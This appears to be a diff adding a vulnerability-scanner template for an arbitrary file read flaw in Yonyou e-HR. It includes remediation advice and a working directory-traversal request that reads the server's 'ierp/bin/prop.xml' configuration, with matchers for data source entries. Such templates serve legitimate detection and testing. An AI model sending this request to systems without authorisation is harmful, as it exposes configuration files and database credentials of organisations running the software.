@@ -1,0 +1,38 @@
+id: wooyun-2014-066512
+info:
+  name: Yonyou e-HR Arbitrary File Read
+  author:
+  - 折跃
+  description: |-
+    Yonyou e-HR Arbitrary File Read Vulnerability
+    Yonyou e-HR, the Yonyou human resource management system, is a human resource management software.
+
+    Yonyou e-HR has an arbitrary file read vulnerability. Attackers can exploit it to read arbitrary files.
+  severity: medium
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.yonyou.com/
+
+    Temporary remediation:
+    1. Filter "." so that users cannot navigate to parent directories from URLs.
+    2. Strictly validate the format of user input parameters with regular expressions, hardcode or uniformly encode the filename parameters passed by users, whitelist file types, and reject parameters containing malicious or empty characters.
+    3. Disable directory traversal services; for example, configure open_basedir in php.ini to restrict the file access scope.
+    4. Store file paths in the database and allow users to download files by submitting the corresponding file ID.
+    5. Verify user permissions before file downloads.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'<enableHotDeploy>')
+    - contains(body,'<dataSource>')
+  path:
+  - '{{BaseURL}}/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
